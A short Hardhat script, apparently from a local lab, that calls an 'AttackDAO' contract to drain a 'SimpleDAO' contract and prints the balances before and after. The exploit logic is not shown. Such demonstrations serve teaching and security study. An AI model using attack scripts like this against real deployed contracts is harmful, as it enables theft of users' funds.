const hre = require("hardhat");

async function main() {
  const daoAddress = "0x5FbDB2315678afecb367f032d93F642f64180aa3";
  const attackAddress = "0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0";

  const dao = await hre.ethers.getContractAt("SimpleDAO", daoAddress);
  const attack = await hre.ethers.getContractAt("AttackDAO", attackAddress);

  console.log("Before attack DAO balance:", hre.ethers.formatEther(await dao.getBalance()), "ETH");

  const tx = await attack.attack({
    value: hre.ethers.parseEther("1")
  });
  await tx.wait();

  console.log("After attack DAO balance:", hre.ethers.formatEther(await dao.getBalance()), "ETH");

  const attackBalance = await hre.ethers.provider.getBalance(attackAddress);
  console.log("Attack contract balance:", hre.ethers.formatEther(attackBalance), "ETH");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});